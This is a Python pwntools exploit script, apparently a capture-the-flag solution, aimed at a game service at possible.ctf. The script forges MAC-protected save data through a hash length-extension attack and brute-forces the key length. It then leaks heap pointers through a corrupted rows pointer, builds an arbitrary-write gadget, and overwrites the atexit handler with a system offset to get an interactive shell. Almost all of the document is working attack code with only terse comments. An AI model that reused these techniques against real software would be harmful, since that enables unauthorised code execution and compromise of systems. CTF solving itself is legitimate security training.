#!/usr/bin/env python3
# coding: utf-8-emacs

# mute DeprecationWarning from hashpumpy
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)

from hashpumpy import hashpump
from pwn import *

# Addresses
freelist            = 0x40d1c0
atexit_list         = 0x40e3c0
system_magic_offset = 0x406bba

def mksock():
    return remote('possible.ctf', 1337)

# Obtain saved game
sock = mksock()
sock.sendline(b'1') # new game
sock.sendline(b'1') # easy
sock.sendline(b'4') # save game
sock.recvuntil(b'safe place:\n')
# Base 64 is split over two lines
save = sock.recvline().strip()
save += sock.recvline().strip()
sock.close()

# Extend saved game
def extend(extra):
    old_save = b64d(save)
    old_hash, old_data = old_save[:20], old_save[20:]
    new_hash_hex, new_data = hashpump(old_hash.hex(), old_data, extra, len_key)
    new_hash = bytes.fromhex(new_hash_hex)
    new_save = new_hash + new_data
    return b64e(new_save).encode()

# Load a saved game
def load(save):
    sock.sendline(b'2') # load game
    sock.recvuntil(b'Enter saved game')
    sock.recvline()
    sock.sendline(extend(save))
    sock.sendline(b'') # send blank line to end
    sock.sendline(b'n') # don't end current game

# Find secret key length
len_key = 0
with log.progress('Finding key length') as p:
    while True:
        with context.silent:
            sock = mksock()
            load(b'\0') # hashpumpy will not accept extra=b''
            line = sock.recvline()
            sock.close()
        if b'MAC error' not in line:
            break
        len_key += 1
        p.status(str(len_key))
    p.success(str(len_key))

# Calculate lengths and game data offset in extension
len_prefix = 20 + align(64, len(b64d(save)) - 20 + len_key + 9) - len_key
len_ext = int(514 - 1.75 * len_prefix)
len_b64 = (len_prefix + len_ext + 2) * 4 // 3
len_all = align(8, len_b64 + 1) + 8 + len_prefix
off_ext = 704 - len_all

info('|key|       = %d' % len_key)
info('|prefix|    = %d' % len_prefix)
info('|ext|       = %d' % len_ext)
info('|base64|    = %d' % len_b64)
info('|all|-|ext| = %d' % len_all)
info('game offset = %d' % off_ext)

sock = mksock()

# Create a new game, placed after free space initially used for color/number
# pairs
sock.recvuntil(b'New game') # sync
sock.sendline(b'1') # new game
sock.sendline(b'3') # hard
sock.sendline(b'6') # exit game
sock.recvuntil(b'New game') # sync

# Trigger bug; now have huge free chunk before game data
load(b'A' * (178 - len_prefix))

# Malloc into game, overwriting the rows pointer with a pointer to the freelist,
# then leak its next pointer.  Also set the game size to 1, so only this one
# pointer is followed.
ext = flat({
    off_ext: {0: p8(1), # game size
              7: p64(freelist), # *rows
    },
}, length=len_ext)
load(ext)
sock.sendline(b'3') # continue game

# Read game, color/number pairs
sock.recvuntil(b'   0')
data = sock.recvuntil(b'   0')
# Dirty hack: get all numbers, figure out relevant ones later
nums = re.findall(r'(\d+)m(\d+)', data.decode())
sock.sendline(b'6') # exit game

# # Trial and error: find relevant pairs
# for i, (x, y) in enumerate(nums):
#     x = int(x)
#     y = int(y)
#     x -= 41
#     if max(x, y) > 0xf:
#         print i, hex(x), hex(y)

i = 3
j = 0
nextptr = (
    int(nums[i][1])       << 24 |
    (int(nums[i][0]) - 41) << 16 |
    int(nums[j][1])        <<  8 |
    (int(nums[j][0]) - 41)
)
# Offsets found in GDB, these do not change
base = nextptr - 0x9f8
game = nextptr - 0x738

# Create arbitrary write gadget
def w64(data, addr):
    ext = flat({
        off_ext: {0: p8(2),
                  7: p64(game + 15),
                  # row pointers
                  15: p64(addr) + p64(game + 31),
                  # second row data
                  31: p64(data),
        },
    }, length=len_ext)
    load(ext)
    sock.sendline(b'3') # continue game
    sock.sendline(b'1') # move
    # swap game pieces
    sock.sendline(b'0 0')
    sock.sendline(b'0 1')
    sock.sendline(b'6') # exit game
    sock.recvuntil(b'New game') # sync

# Overwrite `atexit` handler with magic `system` offset.
w64(system_magic_offset, atexit_list)

# Quit game to pop a shell
sock.sendline(b'5') # quit

# Should have shell now
sock.clean()
sock.interactive()
